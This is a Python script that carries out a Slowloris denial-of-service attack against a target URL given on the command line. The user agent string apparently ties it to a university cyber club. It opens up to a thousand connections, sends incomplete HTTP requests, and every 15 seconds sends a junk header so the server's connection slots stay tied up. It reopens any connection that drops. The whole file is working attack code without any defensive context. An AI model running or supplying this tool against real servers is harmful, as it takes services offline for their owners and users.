from urllib.parse import urlparse
import random
import socket
import ssl
import sys
import time

# Make sure they have the necessary arguments
if len(sys.argv) <= 1:
    print('Needs target site')
    sys.exit(1)

# 
SOCKET_NUM = int(sys.argv[2]) if len(sys.argv) > 2 else 1000
userAgent = 'SlowLoris (cyber@UCR)'
socketList = []
headers = [
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
	"Accept-language: en-US,en,q=0.5",
]

# Check to make sure the user provided a target


def createSocket(url):
    pieces = urlparse(url) # Extract pieces of URL
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    # Check if the connection is an https connection
    if pieces.scheme == 'https':
        ssl.wrap_socket(s)

    # Get the port number from the URL (default to 80)
    portNum = int(pieces.port) if pieces.port else 80
    # Resolve the hostname to an IP address
    targetIp = socket.gethostbyname(pieces.hostname)
    # Connect to the socket
    s.connect((targetIp, portNum))

    # Start sending HTTP headers to the open TCP socket
    targetPath = '/' if not pieces.path else pieces.path
    s.send('GET {} HTTP/1.1\r\n'.format(targetPath).encode('utf-8'))
    s.send('Host: {}\r\n'.format(pieces.hostname).encode('utf-8'))
    s.send('User-Agent: {}\r\n'.format(userAgent).encode('utf-8'))
    # Copy other Firefox headers
    for header in headers:
    	s.send((header+ '\r\n').encode('utf-8'))
    return s


def main():
	print("Connecting to {} with {} connections".format(sys.argv[1], SOCKET_NUM))

	# Create new socket connections
	for i in range(SOCKET_NUM):
		try:
			s = createSocket(sys.argv[1])
			socketList.append(s)
		except socket.error:
			print('Failed to create new socket:', socket.error)
			break

	# Keep all the connections alive
	while True:
		print("Sending keep-alive headers...")

		for s in socketList:
			try:
				s.send("X-bs: b\r\n".encode("utf-8"))
			except socket.error:
				print('Socket died!')
				socketList.remove(s)
				try:
					s2 = createSocket(sys.argv[1])
					socketList.append(s2)
				except socket.error:
					print('Failed to reinitialize socket')
					continue
		time.sleep(15)

if __name__ == "__main__":
    main()
